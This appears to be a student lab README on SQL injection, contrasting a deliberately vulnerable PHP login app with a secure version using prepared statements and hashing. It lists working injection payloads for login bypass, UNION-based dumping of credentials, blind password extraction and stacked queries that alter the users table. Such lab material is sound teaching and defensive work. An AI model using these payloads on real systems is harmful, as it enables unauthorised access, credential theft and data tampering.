# Lab 5 - SQL Injection Attack and Defense

---

## 🧩 Overview

This lab demonstrates:

* SQL Injection vulnerabilities in a web application
* Different types of SQL Injection attacks
* Database modification using injection
* Secure coding practices to prevent attacks

Two versions of the application are implemented:

| Application        | Description                                  |
| ------------------ | -------------------------------------------- |
| **vulnerable_app** | Uses raw SQL queries → vulnerable to attacks |
| **secure_app**     | Uses prepared statements + hashing → secure  |

---

## ⚙️ Setup Instructions

### Step 1: Install XAMPP

* Download from: https://www.apachefriends.org
* Install and open XAMPP Control Panel
* Start:

  * Apache
  * MySQL

---

### Step 2: Place Project Files

Copy folders into:

```
C:\xampp\htdocs\
```

```
vulnerable_app/
secure_app/
```

---

## 🗄️ Database Setup

---

### 🔴 Database 1: Vulnerable (Plain Text)

Open:

```
http://localhost/phpmyadmin
```

Run:

```sql
CREATE DATABASE lab5;
USE lab5;

CREATE TABLE users (
    username VARCHAR(50),
    password VARCHAR(50)
);

INSERT INTO users VALUES ('user1', 'pass1');
INSERT INTO users VALUES ('admin', 'admin123');
```

---

### 🟢 Database 2: Secure (Hashed Passwords)

```sql
CREATE DATABASE lab5_hashed;
USE lab5_hashed;

CREATE TABLE users (
    username VARCHAR(50) PRIMARY KEY,
    password VARCHAR(255)
);
```

---

### 🔐 Generate Hashed Passwords

Create `hash.php`:

```php
<?php
echo password_hash("pass1", PASSWORD_DEFAULT) . "<br>";
echo password_hash("admin123", PASSWORD_DEFAULT);
?>
```

Run:

```
http://localhost/hash.php
```

Copy output hashes and insert:

```sql
INSERT INTO users VALUES 
('user1', '<hash1>'),
('admin', '<hash2>');
```

---

## 🌐 Access Applications

| App            | URL                              |
| -------------- | -------------------------------- |
| Vulnerable App | http://localhost/vulnerable_app/ |
| Secure App     | http://localhost/secure_app/     |

---

## 🔑 Test Credentials

| Username | Password |
| -------- | -------- |
| user1    | pass1    |
| admin    | admin123 |

---

# 💥 SQL Injection Attacks (Vulnerable App)

---

## 🔓 Attack 1: Authentication Bypass

**Payloads:**

```
admin'-- 
' OR '1'='1' #
```

**Result:**

* Login succeeds without password

---

## 📊 Attack 2: UNION-Based Injection

```
' UNION SELECT username, password FROM users-- 
```

**Result:**

* Dumps all usernames and passwords

---

## 🧠 Attack 3: Blind SQL Injection

### Boolean-based:

```
admin' AND 1=1--   → TRUE
admin' AND 1=2--   → FALSE
```

---

### Password Extraction:

```
admin' AND SUBSTRING(password,1,1)='a'-- 
```

* Success → character correct
* Failure → incorrect guess

---

## 💣 Attack 4: Database Modification (Stacked Queries)

### UPDATE:

```
admin'; UPDATE users SET password='hacked' WHERE username='admin'-- 
```

---

### INSERT:

```
admin'; INSERT INTO users VALUES ('attacker','1234')-- 
```

---

### DELETE:

```
admin'; DELETE FROM users WHERE username='attacker'-- 
```

---

### 📸 Required Proof:

* BEFORE screenshot
* AFTER screenshot (phpMyAdmin)

---

# 🔐 Secure Application Features

---

## ✅ 1. Prepared Statements

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username=?");
```

* Prevents SQL injection
* Input treated as data, not query

---

## ✅ 2. Password Hashing

```php
password_hash()
password_verify()
```

* Passwords not stored in plain text
* Even DB leak ≠ password exposure

---

## ✅ 3. Input Validation

* Special characters filtered
* Malicious patterns blocked

---

## ✅ 4. No SQL Error Exposure

* Prevents attackers from learning DB structure

---

# ❌ Attacks on Secure App (All FAIL)

| Attack               | Result |
| -------------------- | ------ |
| `' OR 1=1 --`        | ❌ Fail |
| `admin'--`           | ❌ Fail |
| `#`, `/* */`         | ❌ Fail |
| Blind SQL            | ❌ Fail |
| UNION                | ❌ Fail |
| UPDATE/INSERT/DELETE | ❌ Fail |

---

## 🧠 Why Attacks Fail

* Queries are precompiled
* Input is never executed as SQL
* Special characters lose meaning

---

# 🔥 Key Learning Points

---

## Vulnerable App

* Uses string concatenation
* Allows:

  * Authentication bypass
  * Data extraction
  * Database modification

---

## Secure App

* Uses:

  * Prepared statements
  * Hashing
  * Input validation

* Prevents:

  * All injection attacks

---

# 🎯 Viva Ready Points

* SQL Injection occurs when user input is directly embedded into queries
* Comments (`--`, `#`, `/* */`) help attackers ignore query parts
* Blind SQL uses TRUE/FALSE responses
* Prepared statements prevent injection by separating query and data
* Hashing ensures passwords are not stored in plain text

---

# 📁 Submission Structure

```
lab5/
├── vulnerable_app/
├── secure_app/
├── Screenshots/
├── README.md
├── SECURITY.md
```

---

# ⚠️ Important Notes

* All attacks must be demonstrated on **vulnerable_app**
* Secure app must block all attacks
* Screenshots required for database modification
* Code must be implemented manually (no copying)

---

# ✅ Final Outcome

✔ Vulnerable system implemented
✔ Multiple SQL injection attacks demonstrated
✔ Database modified via injection
✔ Secure system implemented
✔ All attacks prevented in secure version

---

🚀 **This completes full SQL Injection lifecycle: attack → exploit → defend**
